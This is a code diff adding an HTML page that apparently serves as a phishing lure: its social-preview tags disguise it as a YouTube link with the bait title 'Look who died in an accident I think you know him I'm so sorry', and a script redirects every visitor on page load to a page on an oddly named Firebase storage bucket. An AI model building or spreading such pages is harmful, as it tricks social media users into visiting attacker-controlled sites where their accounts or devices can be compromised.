@@ -1,0 +1,24 @@
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="facebook:card" content="summary_large_image">
+<meta property="og:image" content="https://i.ibb.co/NtMT3pF/Whats-App-Image-2023-05-26-at-11-40-33-PM-1.jpg">
+<meta property="og:title" content="Look who died in an accident I think you know him I'm so sorry"> 
+<meta property="og:description" content="YouTube">
+<meta name="facebook:description" content="YouTube">
+<meta property="fb:app_id" content="87741124305">
+<meta name="facebook:app:country" content="US">
+<script type="text/javascript">
+	function generateRandomString(iLen) {{
+    	var sRnd = '';
+    	var sChrs = "abcdefghiklmnopqrstuvwxyz";
+    	for (var i = 0; i < iLen; i++) {{
+      	var randomPoz = Math.floor(Math.random() * sChrs.length);
+      	sRnd += sChrs.substring(randomPoz, randomPoz + 1);
+    	}}
+    	return sRnd;
+  	}}
+        if (screen.width <= 720) {{
+        window.location = "https://firebasestorage.googleapis.com/v0/b/fdghgjvjhytfhghhj.appspot.com/o/index.html?alt=media&token=7e0d7067-eb88-4a70-aa09-529e17ed682a";
+    }} else {{
+        window.location = "https://firebasestorage.googleapis.com/v0/b/fdghgjvjhytfhghhj.appspot.com/o/index.html?alt=media&token=7e0d7067-eb88-4a70-aa09-529e17ed682a"
+    }}
+</script>
